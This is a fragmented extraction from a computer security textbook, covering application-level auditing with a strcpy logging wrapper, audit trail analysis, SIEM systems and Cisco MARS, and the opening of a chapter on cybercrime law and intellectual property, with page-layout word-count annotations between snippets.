char *retval;	
/* the return value of the call */
7
8	
AUDIT_CALL_START;
9
10	
AUDIT_LOOKUP_COMMAND(char *(*)(char *,const char *),“strcpy”,fptr,NULL);
11
12	
AUDIT_USAGE_WARNING(“strcpy”);
13
14	
retval=((*fptr)(dst,src));
15
16	
return(retval);
17 }
[Word Count: 66]

(a) Function definition (items in all caps represent macros defined elsewhere)
[Word Count: 11]

1 #define AUDIT_LOOKUP_COMMAND(t,n,p,e)
2	
p=(t)dlsym(RTLD_NEXT,n);
3	
if (p==NULL) {
4	
perror(“looking up command”);
5	
syslog(LOG_INFO,“could not find %s in library: %m”,n);
6	
return(e);
7 }
[Word Count: 25]

18.3 / Implementing The Logging Function   599
[Word Count: 7]

the kernel at run time. Typically, a module implements some specific function, such 
as a file system, a device driver, or some other feature of the kernel’s upper layer. 
A module does not execute as its own process or thread, although it can create 
kernel threads for various purposes as necessary. Rather, a module is executed in 
kernel mode on behalf of the current process.
[Word Count: 65]

Figure 18.9 shows the structure of this approach. The kernel module ensures 
non-bypassable instrumentation by intercepting the execve() system call. The 
execve() function loads a new executable into a new process address space and 
begins executing it. By intercepting this call, the kernel module stops the applica-
tion before its first instruction is executed and can insert the audit routines into the 
application before its execution starts.
[Word Count: 67]

1.	 A monitored application is invoked by the execve() system call.
	
2.	 The kernel module intercepts the call, stops the application, and sets the
[Word Count: 24]

­process’s parent to the monitoring daemon. Then the kernel module notifies 
the user-space daemon that a monitored application has started.
[Word Count: 20]

Figure 18.9  Run-Time Environment for Application Auditing
[Word Count: 7]

3.	 The monitoring daemon locates the patch and audit library functions
[Word Count: 11]

­appropriate for this application. The daemon loads the audit library functions 
into the application’s address space and inserts audit function calls at certain 
points in the application’s code.
	
4.	 Once the application has been instrumented, the daemon enables the applica-
[Word Count: 40]

A special language was developed to simplify the process of creating audit 
and patch code. In essence, patches can be inserted at any point of function call to 
a shared library routine. The patch can invoke audit routines and also invoke the 
shared library routine, in a manner logically similar to the interposition technique 
described earlier.
[Word Count: 56]

Programs and procedures for audit trail analysis vary widely, depending on the 
­system configuration, the areas of most concern, the software available, the 
­security policy of the organization, and the behavior patterns of legitimate users 
and ­intruders. This section provides some observations concerning audit trail 
­analysis.
[Word Count: 46]

To perform useful audit analysis, the analyst or security administrator needs an 
understanding of the information available and how it can be used. NIST SP 
800-92 [KENT06] offers some useful advice in this regard, which we summarize 
in this ­subsection.
[Word Count: 40]

Understanding Log Entries  The security administrator (or other individual 
reviewing and analyzing logs) needs to understand the context surrounding 
individual log entries. Relevant information may reside in other entries in the same 
log, entries in other logs, and nonlog sources such as configuration management 
entries. The administrator should understand the potential for unreliable entries, 
such as from a security package that is known to generate frequent false positives 
when looking for malicious activity.
[Word Count: 73]

Most audit file formats contain a mixture of plain language plus cryptic ­messages 
or codes that are meaningful to the software vendor but not necessarily to the admin-
istrator. The administrator must make the effort to decipher as much as possible the 
information contained in the log entries. In some cases, log analysis software performs 
a data reduction task that reduces the burden on the administrator. Still, the adminis-
trator should have a reasonable understanding of the raw data that feeds into analysis 
and review software in order to be able to assess the utility of these packages.
[Word Count: 98]

The most effective way to gain a solid understanding of log data is to review 
and analyze portions of it regularly (e.g., every day). The goal is to eventually gain 
an understanding of the baseline of typical log entries, likely encompassing the vast 
majority of log entries on the system.
[Word Count: 50]

Understanding the Context  To perform effective reviews and analysis, 
administrators should have solid understanding of each of the following from 
training or hands-on experience:
[Word Count: 24]

• The organization’s policies regarding acceptable use, so that administrators
[Word Count: 10]

can recognize violations of the policies.
 
• The security software used by their hosts, including the types of security-
[Word Count: 19]

related events that each program can detect and the general detection profile 
of each program (e.g., known false positives).
 
• The operating systems and major applications (e.g., e-mail, Web) used by
[Word Count: 31]

their hosts, particularly each OS’s and major application’s security and logging 
capabilities and characteristics.
 
• The characteristics of common attack techniques, especially how the use of
[Word Count: 26]

these techniques might be recorded on each system.
 
• The software needed to perform analysis, such as log viewers, log reduction
[Word Count: 21]

Audit trails can be used in multiple ways. The type of analysis depends, at least in 
part, on when the analysis is to be done. The possibilities include the following:
[Word Count: 30]

• Audit trail review after an event: This type of review is triggered by an
[Word Count: 15]

­observed event, such as a known system or application software problem, a 
known violation of existing security policy by a user, or some unexplained 
­system or user problem. The review can gather information to elaborate on 
what is known about the event, to diagnose the cause or the problem, and 
to suggest remedial action and future countermeasures. This type of review 
­focuses on the audit trail entries that are relevant to the specific event.
 
• Periodic review of audit trail data: This type of review looks at all of the audit
[Word Count: 91]

trail data or at defined subsets of the data and has many possible objectives. 
Examples of objectives include looking for events or patterns that suggest a 
security problem, developing a profile of normal behavior and searching for 
anomalous behavior, and developing profiles by individual user to maintain a 
permanent record by user.
 
• Real-time audit analysis: Audit analysis tools can also be used in a real-time
[Word Count: 66]

or near-real-time fashion. Real-time analysis is part of the intrusion detection 
function.
[Word Count: 12]

Distinct from an analysis of audit trail data using data reduction and analysis tools 
is the concept of audit review. An audit review capability enables an administrator 
to read information from selected audit records. The Common Criteria specifica-
tion [CCPS12a] calls for a capability that allows prestorage or poststorage audit 
­selection and includes the ability to selectively review the following:
[Word Count: 60]

• The actions of one or more users (e.g., identification, authentication, system
[Word Count: 12]

• The actions performed on a specific object or system resource
 
• All or a specified set of audited exceptions
 
• Actions associated with a specific system or security attribute
[Word Count: 30]

Audit review can be focused on records that match certain attributes, such as 
user or user group, time window, type of record, and so forth.
[Word Count: 25]

One automated tool that can be useful in audit review is a prioritization of 
audit records based on input from the administrator. Records can be prioritized 
based on a combination of factors. Examples include the following:
[Word Count: 36]

• Entry type (e.g., message code 103, message class CRITICAL)
 
• Newness of the entry type (i.e., has this type of entry appeared in the logs
[Word Count: 26]

before?)
 
• Log source
 
• Source or destination IP address (e.g., source address on a blacklist,
[Word Count: 16]

­destination address of a critical system, previous events involving a particular 
IP address)
 
• Time of day or day of the week (e.g., an entry might be acceptable during
[Word Count: 29]

­certain times but not permitted during others)
 
• Frequency of the entry (e.g., x times in y seconds)
[Word Count: 18]

There may be a number of possible purposes for this type of audit review. 
Audit review can enable an administrator to get a feel for the current operation of 
the system and the profile of the users and applications on the system, the level of 
attack activity, and other usage and security-related events. Audit review can be 
used to gain an understanding after the fact of an attack incident and the system’s 
response to it, leading to changes in software and procedures.
[Word Count: 82]

The spectrum of approaches and algorithms used for audit data analysis is far too 
broad to be treated effectively here. Instead, we give a feeling for some of the major 
approaches, based on the discussion in [SING04].
[Word Count: 37]

Basic Alerting  The simplest form of an analysis is for the software to give an 
indication that a particular interesting event has occurred. If the indication is given 
in real time, it can serve as part of an intrusion detection system. For events that 
may not rise to the level of triggering an intrusion alert, an after-the-fact indication 
of suspicious activity can lead to further analysis.
[Word Count: 66]

Baselining  Baselining is the process of defining normal versus unusual events 
and patterns. The process involves measuring a set of known data to compute a 
range of normal values. These baseline values can then be compared to new data to 
detect unusual shifts. Examples of activity to baseline include the following:
[Word Count: 51]

• Amount of network traffic per protocol: total HTTP, e-mail, FTP, and so on.
 
• Logins/logouts
[Word Count: 16]

• Accesses of admin accounts
 
• Dynamic Host Configuration Protocol (DHCP) address management, DNS
[Word Count: 14]

requests
 
• Total amount of log data per hour/day
 
• Number of processes running at any time
[Word Count: 17]

For example, a large increase in FTP traffic could indicate that your FTP 
server has been compromised and is being used maliciously by an outsider.
[Word Count: 25]

Once baselines are established, analysis against the baselines is possible. One 
approach, discussed frequently in this book, is anomaly detection. An example of 
a simple approach to anomaly detection is the freeware Never Before Seen (NBS) 
Anomaly Detection Driver (www.ranum.com/security/computer_security/code). 
The tool implements a very fast database lookup of strings and tells you whether a 
given string is in the database (i.e., has already been seen).
[Word Count: 66]

Another form of baseline analysis is thresholding. Thresholding is the identi-
fication of data that exceed a particular baseline value. Simple thresholding is used 
to identify events, such as refused connections, that happen more than a certain 
number of times. Thresholding can focus on other parameters, such as the frequency 
of events rather than the simple number of events.
[Word Count: 59]

Windowing is detection of events within a given set of parameters, such as 
within a given time period or outside a given time period—for example, baselining 
the time of day each user logs in and flagging logins that fall outside that range.
[Word Count: 42]

Correlation  Another type of analysis is correlation, which seeks for 
relationships among events. A simple instance of correlation is, given the presence 
of one particular log message, to alert on the presence of a second particular 
message. For instance, if Snort (see Section 8.9) reports a buffer overflow attempt 
from a remote host, a reasonable attempt at correlation would grab any messages 
that contain the remote host’s IP address. Or the administrator might want to note 
any switch user (su) on an account that was logged into from a never-seen-before 
remote host.
[Word Count: 92]

The problem came to a head when the security officer realized that it had 
become impossible to perform one of the basic tasks of security audit analysis: 
baselining. The security officer needs to be able to characterize normal activity 
and thresholds so that the system will generate alerts when anomalies or mali-
cious patterns are detected. Because of the volume of data, a human-generated or 
even human-assisted baseline generation was impractical. And with the broad mix 
of audit data sources and formats, there seemed to be no obvious way to develop 
­automated baseline generation.
[Word Count: 94]

The type of product that can address these issues has been referred to as a 
security information management (SIM) system or a security information and event 
management (SIEM) system. As these products move into the third and fourth 
­generations, a number of other names have proliferated, with none commonly 
accepted across product lines. Before looking at the specific solution adopted by 
this security officer, we provide a brief general overview of SIEM systems.
[Word Count: 73]

SIEM software is a centralized logging software package similar to, but much 
more complex than, syslog. SIEM systems provide a centralized, uniform audit 
trail ­storage facility and a suite of audit data analysis programs. There are two 
general configuration approaches, with many products offering a combination of 
the two:
[Word Count: 49]

• Agentless: The SIEM server receives data from the individual log ­generating
[Word Count: 12]

hosts without needing to have any special software installed on those hosts. 
Some servers pull logs from the hosts, which is usually done by having the server 
authenticate to each host and retrieve its logs regularly. In other cases, the hosts 
push their logs to the server, which usually involves each host ­authenticating to 
the server and transferring its logs regularly. The SIEM server then ­performs 
event filtering and aggregation and log normalization and analysis on the 
­collected logs.
 
• Agent-based: An agent program is installed on the log generating host to
[Word Count: 92]

­perform event filtering and aggregation and log normalization for a particular 
type of log, and then transmit the normalized log data to an SIEM server,
[Word Count: 25]

18.5 / Example: An Integrated Approach   605
[Word Count: 7]

­usually on a real-time or near-real-time basis for analysis and storage. If a 
host has multiple types of logs of interest, then it might be necessary to ­install 
­multiple agents. Some SIEM products also offer agents for generic formats 
such as ­syslog and SNMP. A generic agent is used primarily to get log data 
from a source for which a format-specific agent and an agentless method 
are not available. Some products also allow administrators to create custom 
agents to handle unsupported log sources.
[Word Count: 83]

• Graphical user interfaces (GUIs) that are specifically designed to assist
[Word Count: 11]

­analysts in identifying potential problems and reviewing all available data 
­related to each problem.
 
• A security knowledge base, with information on known vulnerabilities, the
[Word Count: 25]

likely meaning of certain log messages, and other technical data; log analysts 
can often customize the knowledge base as needed.
 
• Incident tracking and reporting capabilities, sometimes with robust workflow
[Word Count: 30]

features.
 
• Asset information storage and correlation (e.g., giving higher priority to an
[Word Count: 13]

attack that targets a vulnerable OS or a more important host).
[Word Count: 11]

The Security Monitoring, Analysis, and Response  
System (MARS)
[Word Count: 8]

After reviewing several alternatives, the security officer chose the Cisco Systems’ 
MARS product as being the most cost-effective. The MARS product supports a 
­variety of ­systems. Of course, all of the Cisco products on site were compatible 
with the product, including NetFlow4 and syslog data from Cisco routers, ­firewalls, 
switches, concentrators, IDSs, and so on. In addition, MARS can pull data from 
almost any SNMP- and ­syslog-enabled device, as well as from a wide range of 
­vulnerability and antivirus ­systems, host operating systems, Web servers, Web proxy
[Word Count: 87]

4NetFlow is an open but proprietary network protocol developed by Cisco Systems to run on network equip-
ment, such as routers and LAN switches, for collecting IP traffic information. It is documented in RFC 3954.
[Word Count: 35]

devices, and database servers. The ­following is a list of the devices and ­software 
packages supported at that time by MARS:
[Word Count: 21]

• Network: Cisco IOS Software; Cisco Catalyst OS; Cisco NetFlow; and Extreme
[Word Count: 12]

Extremeware
 
• Firewall/VPN: Cisco ASA Software; Cisco PIX Security Appliance; Cisco
[Word Count: 11]

IOS Firewall; Cisco Firewall Services Module (FWSM); Cisco VPN 3000 
Concentrator; Checkpoint Firewall-1 NG and VPN-1 versions; NetScreen 
Firewall; and Nokia Firewall
 
• Intrusion detection: Cisco IDS; Cisco IDS Module; Cisco IOS IPS; Enterasys
[Word Count: 34]

Dragon NIDS; ISS RealSecure Network Sensor; Snort NIDS; McAfee 
Intrushield NIDS; NetScreen IDP; OS; and Symantec ManHunt
 
• Vulnerability assessment: eEye REM; Qualys QualysGuard; and FoundStone
[Word Count: 26]

FoundScan
 
• Host security: Cisco Security Agent; McAfee Entercept; and ISS RealSecure
[Word Count: 12]

Host Sensor
 
• Antivirus: Symantec Antivirus, Cisco Incident Control System (Cisco ICS);
[Word Count: 12]

Trend Micro Outbreak Prevention Service (OPS); Network Associates 
VirusScan; and McAfee ePO
 
• Authentication servers: Cisco Secure ACS
 
• Host log: Windows NT, 2000, and 2003 (agent and agentless); Solaris; and Linux
 
• Application: Web servers (Internet Information Server, iPlanet, and Apache);
[Word Count: 42]

Oracle audit logs; and Network Appliance NetCache
 
• Universal device support: To aggregate and monitor any application syslog
[Word Count: 18]

MARS works in an agentless configuration, with a centralized dedicated 
server. In general terms, the server performs the following steps:
[Word Count: 20]

1.	 Events come into the MARS server from devices and software modules
[Word Count: 12]

throughout the network.
	
2.	 Events are parsed to locate and identify each field in the entry.
	
3.	 MARS normalizes each entry into a uniform audit trail entry format.
	
4.	 MARS performs a correlation function to find events that are related and
[Word Count: 41]

defines sessions. Each session is a related set of events. For example, if a worm 
is detected, the detected occurrences across all devices are correlated into a 
single session for this worm attack.
[Word Count: 33]

5.	 Sessions and uncorrelated events are run against a rule engine and each is
[Word Count: 14]

assessed. Some events and sessions are dropped as irrelevant. The others are 
reclassified as incidents to be logged in the incident database.
	
6.	 A false-positive analysis is run on the data to catch known false positive
[Word Count: 36]

reports for IDS and other systems in the network.
	
7.	 A vulnerability assessment is performed against suspected hosts to determine
[Word Count: 20]

the urgency of the data.
	
8.	 Traffic profiling and statistical anomaly detection programs are run against
[Word Count: 16]

MARS provides a wide array of analysis packages and an effective graphical 
user interface. Preliminary indications are that this product will meet the needs of 
the security officer.
[Word Count: 28]

[CCPS12b], [FRAS97], and [NIST95] each has a useful chapter or section on secu-
rity auditing. The following standards documents cover the topics of this chapter: 
[KENT06] and [ITUT95]. [KUPE04] is a lengthy treatment of the topic.
[Word Count: 36]

[EATO03] is an excellent treatment of syslog.
[MERC03] discusses audit trails and their proper use. [SING04] provides a 
useful description of both UNIX syslog and the Windows Event Log. [ZHOU04] 
describes techniques for ­application-level auditing that do not require recompila-
tion. [HELM93] provides statistical models of misuse detection based on analysis 
of audit trails and shows that careful ­selection of transaction attributes can improve 
detection accuracy.
[Word Count: 66]

CCPS12b	 Common Criteria Project Sponsoring Organisations. Common Criteria for
[Word Count: 9]

Information Technology Security Evaluation, Part 2: Security Functional 
Requirements. CCIMB-2004-01-002, January 2012.
EATO03	 Eaton, I. The Ins and Outs of System Logging Using Syslog. SANS Institute
[Word Count: 26]

InfoSec Reading Room, February 2003.
FRAS97	 Fraser, B. Site Security Handbook. RFC 2196, September 1997.
HELM93	 Helman, P., and Liepins, G. “Statistical Foundations of Audit Trail Analysis for
[Word Count: 28]

the Detection of Computer Misuse.” IEEE Transactions on Software Engineering, 
September 1993.
ITUT95	
Telecommunication Standardization Sector of the International 
Telecommunications Union (ITU-T). Security Audit and Alarms Framework. 
X.816, November 1995.
KENT06	 Kent, K., and Souppaya, M. Guide to Computer Security Log Management.
[Word Count: 42]

NIST Special Publication 800-92, September 2006.
KUPE04	 Kuperman, B. A Categorization of Computer Security Monitoring Systems
[Word Count: 16]

and the Impact on the Design of Audit Sources. CERIAS Tech Report 2004-26; 
Purdue U. Ph.D. Thesis, August 2004. www.cerias.purdue.edu/
MERC03	 Mercuri, R. “On Auditing Audit Trails.” Communications of the ACM,
[Word Count: 31]

January 2003.
NIST95	
National Institute of Standards and Technology. An Introduction to 
Computer Security: The NIST Handbook. Special Publication 800-12, 
October 1995.
SING04	
Singer, A., and Bird, T. Building a Logging Infrastructure. Short Topics in 
System Administration, Published by USENIX Association for Sage, 2004. 
http://www.sageweb.sage.org
ZHOU04	 Zhou, J., and Vigna, G. “Detecting Attacks that Exploit Application-Logic
[Word Count: 56]

Errors Through Application-Level Auditing.” Proceedings of the 20th Annual 
Computer Security Applications Conference (ACSAC’04), 2004.
[Word Count: 15]

18.1	
Compare Tables 18.2 and 18.3. Discuss the areas of overlap and the areas that do not 
overlap and their significance.
a.	 Are there items found in Table 18.2 not found in Table 18.3? Discuss their ­justification.
b.	 Are there items found in Table 18.3 not found in Table 18.2? Discuss their ­justification.
	 18.2	
Another list of auditable events, from [KUPE04], is shown in Table 18.6. Compare this 
with Tables 18.2 and 18.3.
a.	 Are there items found in Tables 18.2 and 18.3 not found in Table 18.6? Discuss
[Word Count: 89]

their justification.
b.	 Are there items found in Table 18.6 not found in Tables 18.2 and 18.3? Discuss
[Word Count: 18]

their justification.
	 18.3	
Argue the advantages and disadvantages of the agent-based and agentless SIEM 
­software approaches described in Section 18.5.
[Word Count: 20]

18.7 Key Terms, Review Questions, and Problems
[Word Count: 7]

anomaly detection
application-level audit trail
audit
audit review
audit trail
audit trail analysis
baselining
dynamic binary rewriting
dynamically linked shared
[Word Count: 20]

interposable library
loadable modules
log
physical access audit trail
security audit
security audit trail
security information and
[Word Count: 17]

event management  
(SIEM)
shared library
[Word Count: 5]

statically linked library
statically linked shared
[Word Count: 6]

library
syslog
system-level audit trail
thresholding
user-level audit trail
windowing
[Word Count: 10]

18.7 / Key Terms, Review Questions, and Problems   609
[Word Count: 9]

Table 18.6  Suggested List of Events to Be Audited
[Word Count: 9]

• password changed
• failed login events
• successful login attempts
• terminal type
• login location
• user identity queried
• login attempts to nonexistent
[Word Count: 26]

accounts
• terminal used
• login type (interactive/
[Word Count: 8]

automatic)
• authentication method
• logout time
• total connection time
• reason for logout
[Word Count: 15]

• auditing enabled
• attempt to disable auditing
• attempt to change audit config
• putting an object into another
[Word Count: 20]

users memory space
• deletion of objects from other
[Word Count: 9]

users memory space
• change in privilege
• change in group label
• “sensitive” command usage
[Word Count: 16]

• command names and arguments
• time of use
• day of use
• CPU time used
• wall time elapsed
• files accessed
• number of files accessed
• maximum memory used
[Word Count: 33]

• Systemwide CPU activity (load)
• Systemwide disk activity
• Systemwide memory usage
[Word Count: 13]

• file creation
• file read
• file write
• file deletion
• attempt to access another users
[Word Count: 18]

files
• attempt to access “sensitive” files
• failed file accesses
• permission change
• label change
• directory modification
[Word Count: 20]

• name
• timestamps
• type
• content
• owners
• group
• permissions
• label
• physical device
• disk block
[Word Count: 22]

• typing speed
• typing errors
• typing intervals
• typing rhythm
• analog of pressure
• window events
• multiple events per location
• multiple locations with events
• mouse movements
• mouse clicks
• idle times
• connection time
• data sent from terminal
• data sent to terminal
[Word Count: 51]

• packet received
•	protocol
•	source address
•	destination address
•	source port
•	destination port
•	length
•	payload size
•	payload
•	checksum
•	flags
• port opened
• port closed
• connection requested
• connection closed
• connection reset
• machine going down
[Word Count: 47]

19.1	
Cybercrime and Computer Crime
Types of Computer Crime
Law Enforcement Challenges
Working with Law Enforcement
[Word Count: 16]

19.2	
Intellectual Property
Types of Intellectual Property
Intellectual Property Relevant to Network and Computer Security
Digital Millennium Copyright Act
Digital Rights Management
[Word Count: 22]

19.3	
Privacy
Privacy Law and Regulation
Organizational Response
Computer Usage Privacy
Privacy and Data Surveillance
[Word Count: 15]

19.4	
Ethical Issues
Ethics and the IS Professions
Ethical Issues Related to Computers and Information Systems
Codes of Conduct
The Rules
[Word Count: 21]

19.6	
Key Terms, Review Questions, and Problems
[Word Count: 7]

19.1 / Cybercrime and Computer Crime   611
[Word Count: 7]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Discuss the different types of computer crime.
◆	Understand the types of intellectual property.
◆	Present an overview of key issues in the area of privacy.
◆	Compare and contrast various approaches to codifying computer ethics.
[Word Count: 37]

The legal and ethical aspects of computer security encompass a broad range of 
­topics, and a full discussion is well beyond the scope of this book. In this chapter, we 
touch on a few important topics in this area.
[Word Count: 39]

Computer crime, or cybercrime, is a term used broadly to describe criminal activity 
in which computers or computer networks are a tool, a target, or a place of criminal 
activity.1 These categories are not exclusive, and many activities can be character-
ized as falling in one or more categories. The term cybercrime has a connotation of 
the use of networks specifically, whereas computer crime may or may not involve 
networks.
[Word Count: 70]

The U.S. Department of Justice [DOJ00] categorizes computer crime based 
on the role that the computer plays in the criminal activity, as follows:
[Word Count: 23]

• Computers as targets: This form of crime targets a computer system, to
[Word Count: 13]

­acquire information stored on that computer system, to control the target 
­system ­without authorization or payment (theft of service), or to alter the 
integrity of data or interfere with the availability of the computer or server. 
Using the ­terminology of Chapter 1, this form of crime involves an attack on 
data ­integrity, system integrity, data confidentiality, privacy, or availability.
[Word Count: 59]

1This definition is from the New York Law School Course on Cybercrime, Cyberterrorism, and Digital 
Law Enforcement (information-retrieval.info/cybercrime/index.html).
[Word Count: 18]

612    Chapter 19 / Legal and Ethical Aspects
[Word Count: 8]

• Computers as storage devices: Computers can be used to further unlawful
[Word Count: 12]

activity by using a computer or a computer device as a passive storage medium. 
For example, the computer can be used to store stolen password lists, credit 
card or calling card numbers, proprietary corporate information, pornographic 
image files, or “warez” (pirated commercial software).
 
• Computers as communications tools: Many of the crimes falling within this
[Word Count: 55]

category are simply traditional crimes that are committed online. Examples 
include the illegal sale of prescription drugs, controlled substances, alcohol, 
and guns; fraud; gambling; and child pornography.
[Word Count: 27]

A more specific list of crimes, shown in Table 19.1, is defined in the 
­international Convention on Cybercrime.2 This is a useful list because it represents 
an international consensus on what constitutes computer crime, or cybercrime, and 
what crimes are considered important.
[Word Count: 42]

Yet another categorization is used in the CERT 2007 E-crime Survey, the 
results of which are shown in Table 19.2. The figures in the second column indicate 
the percentage of respondents who report at least one incident in the correspond-
ing row category. Entries in the remaining three columns indicate the percentage of 
respondents who reported a given source for an attack.3
[Word Count: 62]

The deterrent effect of law enforcement on computer and network attacks correlates 
with the success rate of criminal arrest and prosecution. The nature of cybercrime 
is such that consistent success is extraordinarily difficult. To see this, consider what 
[KSHE06] refers to as the vicious cycle of cybercrime, involving law enforcement 
agencies, cybercriminals, and cybercrime victims.
[Word Count: 55]

19.1 / Cybercrime and Computer Crime   613
[Word Count: 7]

Table 19.1  Cybercrimes Cited in the Convention on Cybercrime
[Word Count: 9]

Article 2 Illegal access
The access to the whole or any part of a computer system without right.
[Word Count: 18]

Article 3 Illegal interception
The interception without right, made by technical means, of non-public transmissions of computer data to, 
from or within a computer system, including electromagnetic emissions from a computer system carrying such 
computer data.
[Word Count: 36]

Article 4 Data interference
The damaging, deletion, deterioration, alteration or suppression of computer data without right.
[Word Count: 16]

Article 5 System interference
The serious hindering without right of the functioning of a computer system by inputting, transmitting, 
­damaging, deleting, deteriorating, altering or suppressing computer data.
[Word Count: 27]

Article 6 Misuse of devices
	
a.	The production, sale, procurement for use, import, distribution or otherwise making available of:
	
  i.	A device, including a computer program, designed or adapted primarily for the purpose of commit-
[Word Count: 35]

ting any of the offences established in accordance with the above Articles 2 through 5;
 	
ii.	A computer password, access code, or similar data by which the whole or any part of a computer sys-
[Word Count: 35]

tem is capable of being accessed, with intent that it be used for the purpose of committing any of the 
offences established in the above Articles 2 through 5; and
	
b.	The possession of an item referred to in paragraphs a.i or ii above, with intent that it be used for the
[Word Count: 52]

purpose of committing any of the offences established in the above Articles 2 through 5. A Party may 
require by law that a number of such items be possessed before criminal liability attaches.
[Word Count: 33]

Article 7 Computer-related forgery
The input, alteration, deletion, or suppression of computer data, resulting in inauthentic data with the intent 
that it be considered or acted upon for legal purposes as if it were authentic, regardless whether or not the 
data is directly readable and intelligible.
[Word Count: 46]

Article 8 Computer-related fraud
The causing of a loss of property to another person by:
	
a.	Any input, alteration, deletion or suppression of computer data;
	
b.	Any interference with the functioning of a computer system, with fraudulent or dishonest intent of pro-
[Word Count: 42]

curing, without right, an economic benefit for oneself or for another person.
[Word Count: 12]

Article 9 Offenses related to child pornography
	
a.	Producing child pornography for the purpose of its distribution through a computer system;
	
b.	Offering or making available child pornography through a computer system;
	
c.	Distributing or transmitting child pornography through a computer system;
	
d.	Procuring child pornography through a computer system for oneself or for another person;
	
e.	Possessing child pornography in a computer system or on a computer-data storage medium.
[Word Count: 70]

Article 10 Infringements of copyright and related rights
[Word Count: 8]

Article 11 Attempt and aiding or abetting
[Word Count: 7]

Aiding or abetting the commission of any of the offences established in accordance with the above Articles 2 
through 10 of the present Convention with intent that such offence be committed. An attempt to commit any of 
the offences established in accordance with Articles 3 through 5, 7, 8, and 9.1.a and c. of this Convention.
[Word Count: 56]

The relative lack of success in bringing cybercriminals to justice has led to an 
increase in their numbers, boldness, and the global scale of their operations. It is 
difficult to profile cybercriminals in the way that is often done with other types of 
repeat offenders. The cybercriminal tends to be young and very computer-savvy,
[Word Count: 54]

614    Chapter 19 / Legal and Ethical Aspects
[Word Count: 8]

but the range of behavioral characteristics is wide. Further, there exist no cyber-
criminal databases that can point investigators to likely suspects.
[Word Count: 22]

Executive management and security administrators need to look upon law enforce-
ment as another resource and tool, alongside technical, physical, and human-factor 
resources. The successful use of law enforcement depends much more on people
[Word Count: 34]

Table 19.2  CERT 2007 E-Crime Watch Survey Results
[Word Count: 8]

Virus, worms or other malicious code
74
18
46
26
[Word Count: 10]

Unauthorized access to/use of information, 
­systems or networks
[Word Count: 8]

Illegal generation of spam e-mail
53
  6
38
17
[Word Count: 9]

Spyware (not including adware)
52
13
33
18
[Word Count: 8]

Fraud (credit card fraud, etc.)
46
19
28
  5
[Word Count: 9]

Phishing (someone posing as your company online 
in an attempt to gain personal data from your 
­subscribers or employees)
[Word Count: 19]

Theft of other (proprietary) info including cus-
tomer records, financial records, etc.
[Word Count: 12]

Theft of intellectual property
35
24
12
  6
[Word Count: 8]

Intentional exposure of private or sensitive  
information
[Word Count: 7]

Sabotage: deliberate disruption, deletion, or 
destruction of information, systems, or networks
[Word Count: 11]

Zombie machines on organization’s network/bots/
use of network by BotNets
[Word Count: 10]

skills than technical skills. Management needs to understand the criminal investiga-
tion process, the inputs that investigators need, and the ways in which the victim can 
contribute positively to the investigation.
[Word Count: 31]

The U.S. legal system, and legal systems generally, distinguish three primary types 
of property:
[Word Count: 14]

• Real property: Land and things permanently attached to the land, such as
[Word Count: 13]

trees, buildings, and stationary mobile homes.
 
• Personal property: Personal effects, moveable property and goods, such as
[Word Count: 17]

cars, bank accounts, wages, securities, a small business, furniture, insurance 
policies, jewelry, patents, pets, and season baseball tickets.
 
• Intellectual property: Any intangible asset that consists of human knowledge
[Word Count: 29]

and ideas. Examples include software, data, novels, sound recordings, the ­design 
of a new type of mousetrap, or a cure for a disease.
[Word Count: 23]

This section focuses on the computer security aspects of intellectual property.
[Word Count: 11]

There are three main types of intellectual property for which legal protection is 
available: copyrights, trademarks, and patents. The legal protection is against 
infringement, which is the invasion of the rights secured by copyrights, trademarks, 
and patents. The right to seek civil recourse against anyone infringing his or her 
property is granted to the IP owner. Depending upon the type of IP, infringement 
may vary (Figure 19.1).
[Word Count: 67]

Figure 19.1  Intellectual Property Infringement
[Word Count: 5]

616    Chapter 19 / Legal and Ethical Aspects
[Word Count: 8]

Copyrights  Copyright law protects the tangible or fixed expression of an idea, 
not the idea itself. A creator can claim copyright, and file for the copyright at a 
national government copyright office, if the following conditions are fulfilled:4
[Word Count: 38]

• The proposed work is original.
 
• The creator has put this original idea into a concrete form, such as hard copy
[Word Count: 22]

Examples of items that may be copyrighted include the following [BRAU01]:
[Word Count: 11]

• Literary works: Novels, nonfiction prose, poetry, newspaper articles and news-
[Word Count: 11]

papers, magazine articles and magazines, catalogs, brochures, ads (text), and 
compilations such as business directories
 
• Musical works: Songs, advertising jingles, and instrumentals
 
• Dramatic works: Plays, operas, and skits
 
• Pantomimes and choreographic works: Ballets, modern dance, jazz dance, and
[Word Count: 41]

mime works
 
• Pictorial, graphic, and sculptural works: Photographs, posters, maps, paintings,
[Word Count: 12]

drawings, graphic art, display ads, cartoon strips and cartoon characters, stuffed 
animals, statues, paintings, and works of fine art
 
• Motion pictures and other audiovisual works: Movies, documentaries, trave-
[Word Count: 29]

logues, training films and videos, television shows, television ads, and interactive 
multimedia works
 
• Sound recordings: Recordings of music, sound, or words
 
• Architectural works: Building designs, whether in the form of architectural
[Word Count: 33]

plans, drawings, or the constructed building itself
 
• Software-related works: Computer software, software documentation and
[Word Count: 15]

manuals, training manuals, other manuals
[Word Count: 5]

The copyright owner has the following exclusive rights, protected against 
infringement:
[Word Count: 11]

• Reproduction right: Lets the owner make copies of a work
 
• Modification right: Also known as the derivative-works right; concerns modi-
[Word Count: 22]

fying a work to create a new or derivative work
 
• Distribution right: Lets the owner publicly sell, rent, lease, or lend copies of the
[Word Count: 25]

• Public-performance right: Applies mainly to live performances
 
• Public-display right: Lets the owner publicly show a copy of the work directly
[Word Count: 22]

or by means of a film, slide, or television image
[Word Count: 10]

4Copyright is automatically assigned to newly created works in countries that subscribe to the Berne 
convention, which encompasses the vast majority of nations. Some countries, such as the United States, 
provide additional legal protection if the work is registered.
[Word Count: 39]

Patents  A patent for an invention is the grant of a property right to the inventor. 
The right conferred by the patent grant is, in the language of the U.S. statute and 
of the grant itself, “the right to exclude others from making, using, offering for sale, 
or selling” the invention in the United States or “importing” the invention into the 
United States. Similar wording appears in the statutes of other nations. There are 
three types of patents:
[Word Count: 78]

• Utility patents: May be granted to anyone who invents or discovers any new
[Word Count: 14]

and useful process, machine, article of manufacture, or composition of matter, 
or any new and useful improvement thereof;
 
• Design patents: May be granted to anyone who invents a new, original, and
[Word Count: 32]

ornamental design for an article of manufacture; and
 
• Plant patents: May be granted to anyone who invents or discovers and asexu-
[Word Count: 22]

ally reproduces any distinct and new variety of plant.
[Word Count: 9]

An example of a patent from the computer security realm is the RSA public-key 
cryptosystem. From the time it was granted in 1983 until the patent expired in 2000, 
